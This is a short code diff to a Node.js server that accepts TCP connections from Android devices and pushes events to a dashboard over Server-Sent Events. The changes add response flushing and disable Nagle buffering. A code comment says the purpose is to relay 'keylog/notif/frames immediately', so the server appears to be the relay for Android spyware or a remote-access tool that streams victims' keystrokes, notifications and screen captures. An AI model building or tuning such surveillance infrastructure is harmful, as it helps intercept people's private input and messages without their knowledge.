@@ -271,6 +271,7 @@ function sseSend(clientId, event, data) {
     const client = sseClients.get(clientId);
     if (client && !client.res.writableEnded) {
         client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
+        if (typeof client.res.flush === 'function') client.res.flush();
     }
 }
 
@@ -279,6 +280,7 @@ function broadcastDash(event, data) {
     for (const [id, client] of sseClients) {
         if (!client.res.writableEnded) {
             client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
+            if (typeof client.res.flush === 'function') client.res.flush();
         }
     }
 }
@@ -546,6 +548,7 @@ const tcpServer = net.createServer((conn) => {
     tcpClients.set(id, conn);
     log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);
 
+    conn.setNoDelay(true);   // disable Nagle — relay keylog/notif/frames immediately
     conn.setEncoding('utf8');
 
     conn.on('data', (chunk) => {
